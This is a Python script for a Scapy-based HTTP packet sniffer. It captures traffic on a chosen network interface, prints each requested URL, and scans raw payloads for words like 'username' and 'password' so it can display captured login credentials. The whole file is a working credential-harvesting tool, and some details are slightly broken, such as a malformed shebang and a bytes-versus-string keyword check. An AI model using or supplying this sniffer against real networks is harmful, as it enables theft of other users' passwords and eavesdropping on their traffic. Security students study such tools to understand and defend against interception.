#!usr/bin/env python 

# sudo pip install scapy_http
import scapy.all as sp
from scapy.layers import http
import argparse
from sys import exit

def get_args():
	parser = argparse.ArgumentParser(description='Packet Sniffer')
	parser.add_argument('-i', '--interface', dest='interface', help='choose interface')
	args = parser.parse_args()

	interface = args.interface
	
	del parser
	return interface


def check_args(intrfce):
	if not intrfce:
		exit("[-] Please enter interface argument, use -h or --help for more info")
	return True


def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
	if packet.haslayer(sp.Raw):
			load = packet[sp.Raw].load
			keywords = ["username", "user", "password", "pass", "login"]
			for keyword in keywords:
				if keyword in load:
					
					return load



def sniffer(intrfce, args_status):
	try:
		if args_status:
			sp.sniff(iface=intrfce, store=False, prn=process_sniffed_pkt)
	except Exception:
		print('[-] An error occured while sniffing...')
def process_sniffed_pkt(packet):
	if packet.haslayer(http.HTTPRequest):
		
		url = get_url(packet)
		print('[+] Http Request >> ' + url + '\n')

		login_info = get_login_info(packet)
		if login_info:
			print('\n\n[+] Contains possible Login information :\n' + login_info + '\n\n')


try:
	INTERFACE = get_args()
	ARGS_STATUS = check_args(INTERFACE)
	sniffer(INTERFACE, ARGS_STATUS)
except KeyboardInterrupt:
	print('[-] Closing Program due to Keyboard Interruption...')
except Exception:
	print('[-] Closing Program due to Error...')
	print(Exception)


